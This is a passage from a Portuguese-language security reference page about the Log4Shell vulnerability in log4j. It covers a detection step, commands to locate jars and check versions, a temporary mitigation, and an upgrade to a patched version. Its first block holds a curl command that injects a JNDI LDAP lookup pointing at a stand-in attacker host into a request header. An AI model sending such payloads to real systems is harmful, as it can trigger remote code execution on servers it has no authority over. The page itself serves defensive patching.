monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:8px;margin:8px;overflow:auto;background:#011627;width:calc(100% - 8px);border-radius:8px;box-shadow:0px 8px 18px 0px rgba(120, 120, 143, 0.10), 2px 2px 10px 0px rgba(255, 255, 255, 0.30) inset"><code class="language-bash" style="white-space:pre;color:#d6deeb;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:rgb(99, 119, 119);font-style:italic"># Verificar se sistema é vulnerável</span><span>
</span><span></span><span class="token" style="color:rgb(130, 170, 255)">curl</span><span> </span><span class="token parameter" style="color:rgb(214, 222, 235)">-H</span><span> </span><span class="token" style="color:rgb(173, 219, 103)">&quot;X-Api-Version: </span><span class="token" style="color:rgb(214, 222, 235)">${jndi</span><span class="token" style="color:rgb(127, 219, 202)">:</span><span class="token" style="color:rgb(214, 222, 235)">ldap</span><span class="token" style="color:rgb(127, 219, 202)">:</span><span class="token" style="color:rgb(127, 219, 202)">/</span><span class="token" style="color:rgb(127, 219, 202)">/</span><span class="token" style="color:rgb(214, 222, 235)">attacker.com</span><span class="token" style="color:rgb(127, 219, 202)">/</span><span class="token" style="color:rgb(214, 222, 235)">a}</span><span class="token" style="color:rgb(173, 219, 103)">&quot;</span><span> http://target.com
</span></code></pre></div>

---

### Verificação de Versão
<div class="widget code-container remove-before-copy"><div class="code-header non-draggable"><span class="iaf s13 w700 code-language-placeholder">bash</span><div class="code-copy-button"><span class="iaf s13 w500 code-copy-placeholder">Copiar</span><img class="code-copy-icon" src="data:image/svg+xml;utf8,%0A%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%3E%0A%20%20%3Cpath%20d%3D%22M10.8%208.63V11.57C10.8%2014.02%209.82%2015%207.37%2015H4.43C1.98%2015%201%2014.02%201%2011.57V8.63C1%206.18%201.98%205.2%204.43%205.2H7.37C9.82%205.2%2010.8%206.18%2010.8%208.63Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%20%20%3Cpath%20d%3D%22M15%204.42999V7.36999C15%209.81999%2014.02%2010.8%2011.57%2010.8H10.8V8.62999C10.8%206.17999%209.81995%205.19999%207.36995%205.19999H5.19995V4.42999C5.19995%201.97999%206.17995%200.999992%208.62995%200.999992H11.57C14.02%200.999992%2015%201.97999%2015%204.42999Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%3C%2Fsvg%3E%0A" /></div></div><pre id="code-01kuqfz1w" style="color:white;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:8px;margin:8px;overflow:auto;background:#011627;width:calc(100% - 8px);border-radius:8px;box-shadow:0px 8px 18px 0px rgba(120, 120, 143, 0.10), 2px 2px 10px 0px rgba(255, 255, 255, 0.30) inset"><code class="language-bash" style="white-space:pre;color:#d6deeb;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:rgb(99, 119, 119);font-style:italic"># Encontrar arquivos log4j</span><span>
</span><span></span><span class="token" style="color:rgb(130, 170, 255)">find</span><span> / </span><span class="token parameter" style="color:rgb(214, 222, 235)">-name</span><span> </span><span class="token" style="color:rgb(173, 219, 103)">&quot;log4j-core-*.jar&quot;</span><span> </span><span class="token file-descriptor" style="color:rgb(214, 222, 235);font-weight:bold">2</span><span class="token" style="color:rgb(127, 219, 202)">&gt;</span><span>/dev/null
</span>
<span></span><span class="token" style="color:rgb(99, 119, 119);font-style:italic"># Verificar versão</span><span>
</span><span></span><span class="token" style="color:rgb(130, 170, 255)">unzip</span><span> </span><span class="token parameter" style="color:rgb(214, 222, 235)">-p</span><span> log4j-core-2.14.1.jar META-INF/MANIFEST.MF </span><span class="token" style="color:rgb(127, 219, 202)">|</span><span> </span><span class="token" style="color:rgb(130, 170, 255)">grep</span><span> Version
</span></code></pre></div>

---

### Mitigação Temporária
<div class="widget code-container remove-before-copy"><div class="code-header non-draggable"><span class="iaf s13 w700 code-language-placeholder">bash</span><div class="code-copy-button"><span class="iaf s13 w500 code-copy-placeholder">Copiar</span><img class="code-copy-icon" src="data:image/svg+xml;utf8,%0A%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%3E%0A%20%20%3Cpath%20d%3D%22M10.8%208.63V11.57C10.8%2014.02%209.82%2015%207.37%2015H4.43C1.98%2015%201%2014.02%201%2011.57V8.63C1%206.18%201.98%205.2%204.43%205.2H7.37C9.82%205.2%2010.8%206.18%2010.8%208.63Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%20%20%3Cpath%20d%3D%22M15%204.42999V7.36999C15%209.81999%2014.02%2010.8%2011.57%2010.8H10.8V8.62999C10.8%206.17999%209.81995%205.19999%207.36995%205.19999H5.19995V4.42999C5.19995%201.97999%206.17995%200.999992%208.62995%200.999992H11.57C14.02%200.999992%2015%201.97999%2015%204.42999Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%3C%2Fsvg%3E%0A" /></div></div><pre id="code-we0jlsdp5" style="color:white;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:8px;margin:8px;overflow:auto;background:#011627;width:calc(100% - 8px);border-radius:8px;box-shadow:0px 8px 18px 0px rgba(120, 120, 143, 0.10), 2px 2px 10px 0px rgba(255, 255, 255, 0.30) inset"><code class="language-bash" style="white-space:pre;color:#d6deeb;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:rgb(99, 119, 119);font-style:italic"># Desabilitar JNDI lookups (Java 8+)</span><span>
</span><span></span><span class="token" style="color:rgb(255, 203, 139)">export</span><span> </span><span class="token assign-left" style="color:rgb(214, 222, 235)">LOG4J_FORMAT_MSG_NO_LOOKUPS</span><span class="token" style="color:rgb(127, 219, 202)">=</span><span>true
</span>
<span></span><span class="token" style="color:rgb(99, 119, 119);font-style:italic"># Ou via JVM option</span><span>
</span><span></span><span class="token parameter" style="color:rgb(214, 222, 235)">-Dlog4j2.formatMsgNoLookups</span><span class="token" style="color:rgb(127, 219, 202)">=</span><span>true
</span></code></pre></div>

---

### Patch Permanente
<div class="widget code-container remove-before-copy"><div class="code-header non-draggable"><span class="iaf s13 w700 code-language-placeholder">bash</span><div class="code-copy-button"><span class="iaf s13 w500 code-copy-placeholder">Copiar</span><img class="code-copy-icon" src="data:image/svg+xml;utf8,%0A%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%3E%0A%20%20%3Cpath%20d%3D%22M10.8%208.63V11.57C10.8%2014.02%209.82%2015%207.37%2015H4.43C1.98%2015%201%2014.02%201%2011.57V8.63C1%206.18%201.98%205.2%204.43%205.2H7.37C9.82%205.2%2010.8%206.18%2010.8%208.63Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%20%20%3Cpath%20d%3D%22M15%204.42999V7.36999C15%209.81999%2014.02%2010.8%2011.57%2010.8H10.8V8.62999C10.8%206.17999%209.81995%205.19999%207.36995%205.19999H5.19995V4.42999C5.19995%201.97999%206.17995%200.999992%208.62995%200.999992H11.57C14.02%200.999992%2015%201.97999%2015%204.42999Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%3C%2Fsvg%3E%0A" /></div></div><pre id="code-799mvaf8r" style="color:white;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:8px;margin:8px;overflow:auto;background:#011627;width:calc(100% - 8px);border-radius:8px;box-shadow:0px 8px 18px 0px rgba(120, 120, 143, 0.10), 2px 2px 10px 0px rgba(255, 255, 255, 0.30) inset"><code class="language-bash" style="white-space:pre;color:#d6deeb;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:rgb(99, 119, 119);font-style:italic"># Atualizar dependência (Maven)</span><span>
</span><span></span><span class="token" style="color:rgb(127, 219, 202)">&lt;</span><span>dependency</span><span class="token" style="color:rgb(127, 219, 202)">&gt;</span><span>
</span><span>    </span><span class="token" style="color:rgb(127, 219, 202)">&lt;</span><span>groupId</span><span class="token" style="color:rgb(127, 219, 202)">&gt;</span><span>org.apache.logging.log4j</span><span class="token" style="color:rgb(127, 219, 202)">&lt;</span><span>/groupId</span><span class="token" style="color:rgb(127, 219, 202)">&gt;</span><span>
</span><span>    </span><span class="token" style="color:rgb(127, 219, 202)">&lt;</span><span>artifactId</span><span class="token" style="color:rgb(127, 219, 202)">&gt;</span><span>log4j-core</span><span class="token" style="color:rgb(127, 219, 202)">&lt;</span><span>/artifactId</span><span class="token" style="color:rgb(127, 219, 202)">&gt;</span><span>
</span><span>    </span><span class="token" style="color:rgb(127, 219, 202)">&lt;</span><span>version</span><span class="token" style="color:rgb(127, 219, 202)">&gt;</span><span class="token" style="color:rgb(247, 140, 108)">2.17</span><span>.</span><span class="token file-descriptor" style="color:rgb(214, 222, 235);font-weight:bold">1</span><span class="token" style="color:rgb(127, 219, 202)">&lt;</span><span>/version</span><span class="token" style="color:rgb(127, 219, 202)">&gt;</span><span>
</span><span></span><span class="token" style="color:rgb(127, 219, 202)">&lt;</span><span>/dependency</span><span class="token" style="color:rgb(127, 219, 202)">&gt;</span><span>
</span></code></pre></div>

---

## 🔗 Links Relacionados

- [[MITRE-ATT&CK]]
- [[OWASP-Top-10]]
- [[Tipos-de-Ataques]]
- [[Nmap]]
- [[Patch-Management]]

---

## 📚 Referências

- NVD: [nvd.nist.gov](https://nvd.nist.gov/)
- MITRE CVE: [cve.mitre.org](https://cve.mitre.org/)
- CWE Top 25: [cwe.mitre.org/top25](https://cwe.mitre.org/top25/)
- Exploit-DB: [exploit-db.com](https://www.exploit-db.com/)
- CVSS Calculator: [nvd.nist.gov/vuln-metrics/cvss/v3-calculator](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator)
